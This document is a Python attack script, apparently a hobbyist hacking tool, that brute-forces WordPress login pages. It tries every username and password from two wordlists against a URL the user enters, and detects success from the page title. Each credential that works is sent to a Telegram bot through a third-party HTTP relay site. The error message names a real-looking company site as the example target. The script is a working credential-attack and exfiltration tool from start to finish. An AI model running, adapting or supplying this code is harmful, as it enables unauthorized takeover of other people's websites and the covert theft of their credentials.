
import requests, threading
from bs4 import BeautifulSoup
from colorama import Fore, Style
import os
import platform
import time
from info import Tokin_ID , chat_ID

def Clear():
    skos = platform.system()
    if skos == "Windows":
        os.system('cls')
    elif skos == 'Linux':
        os.system('clear')
Clear()

    



def Brut_Force():
    try:
        txt = f"""
                
                ▌ ▐·      ▄▄▌   ▄ .▄ ▄▄▄· ▄▄▌ ▄▄▄▄▄ ▄· ▄▌
                ▪█·█▌▪     ██•  ██▪{Fore.BLUE}▐█▐█ ▀█ ██• •██  ▐█▪██▌
                ▐█▐█• ▄█▀▄ ██▪  ██▀▐█▄█▀▀█ ██▪  ▐█.▪▐█▌▐█▪
                ███ ▐█▌.▐▌▐█▌▐▌██▌▐▀▐█ ▪▐▌▐█▌▐▌▐█▌· ▐█▀·.
                . ▀   ▀█▄▀▪.▀▀▀ {Fore.RESET}▀▀▀ · ▀  ▀ .▀▀▀ ▀▀▀   ▀ • 

    {Fore.RED}-|   GitHub -> VOLHALTY | Telegram -> @ETAAL          |-
    {Fore.BLUE}  ------------------------------------------------------
        """
        print(Fore.CYAN + txt)

        user_input = input( Fore.LIGHTRED_EX + '[?]' +f'{Style.RESET_ALL}ENTER THE SITE? ').strip()

        username_List = open("F:\Puthon_men\BurtFors\susss.txt", "r")
        username_List_read = username_List.readlines()
        user_read = username_List_read[len(username_List_read)//2:]
        user_read1 = username_List_read[:len(username_List_read)//2]

        username_List.close()

        pass_List = open("F:\Puthon_men\BurtFors\pass.txt", "r")
        pass_List_read = pass_List.readlines()

        pass_List.close()

        session = requests.session()
        
        for user in username_List_read:
            # ligin_ok = False
            for pass1 in pass_List_read:

                user_pass_Done = {
                    "log": user.strip(),
                    "pwd": pass1.strip(),
                    "wp-submit": "Log In",
                }
                
                reques = session.post(
                    user_input, data=user_pass_Done
                )
                html = BeautifulSoup(reques.text, "html.parser")
                title = html.findAll("title")
                FindAll_title = title[0].string
                if FindAll_title == "Log In ‹ SS — WordPress":
                    print( '\n' +
                        Fore.RED
                        + f"[ ! ]  Login failed !! ==> {user_pass_Done['log']}:{user_pass_Done['pwd']}" 
                    )
                else:

                    print(
                        Fore.YELLOW
                        + f"[ ! ]  Successful login !! ==> {user_pass_Done['log']}:{user_pass_Done['pwd'] }" 
                    )
                    Bot_REQ(
                    '< 𝐋𝐎𝐆𝐈𝐍 𝐖𝐀𝐒 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 >' + '\n'+'\n'

                    f"[ ! ] Successful login !! ==> {user_pass_Done['log']} : {user_pass_Done['pwd'] }" 
                    + '\n'+'\n'
                    + f'𝐔𝐑𝐋 : {str(user_input).split('/')[2]}'
                    + '\n'
                    +'\n'
                    +'\n'
                    + '𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : @ETAAL | 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 : @daklegenda ' 


                    )

                #     ligin_ok = True
                #     break
                    
                # if ligin_ok:
                #         break
    except requests.exceptions.MissingSchema:
        print('\n')
        print(Fore.CYAN + 'The Url Was Not Entered Correctly !!!')
        print( Fore.RESET+ f'For example -> {Fore.RED} https://ssworldwidesolutions.com/wp-login.php')
        time.sleep(3)
        Clear()
        Brut_Force()
    except IndexError:
        print('\n')
        
        print(Fore.LIGHTRED_EX +'The URL sent is invalid !!')
        time.sleep(3)
        Clear()
        Brut_Force()


def Bot_REQ (REQ):

    
    # chat_id = open('F:\Puthon_men\BurtFors\chat_id.txt' , 'r')
    # chat_id_read = chat_id.read().split('\n')

    # chat_id.close()

    # Tokin_id = open('F:\Puthon_men\BurtFors\Tokin.txt' , 'r')
    # Tokin_id_read = Tokin_id.read().split('\n')
    # for chat_ID in chat_id_read:
    #     for Tokin_ID in Tokin_id_read:

        
            # chat_id = input('Telegram number ID? ')
            # Tokin_bot = input('Enter bot token? ')
            # Tokin = f'https://api.telegram.org/bot{Tokin_bot}/sendmessage?chat_id={chat_id}&text={REQ}'
            Tokin = f'https://api.telegram.org/bot{Tokin_ID}/sendmessage?chat_id={chat_ID}&text={REQ}'
            deata_bot = {
                "UrlBox": Tokin,
                "AgentList": "Google Chrome",
                "VersionsList": " HTTP/1.1",
                "MethodList": "GET",
                }
            url_HTTP = 'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx'
            reqosts_Bot = requests.post(url_HTTP , data=deata_bot)


Brut_Force()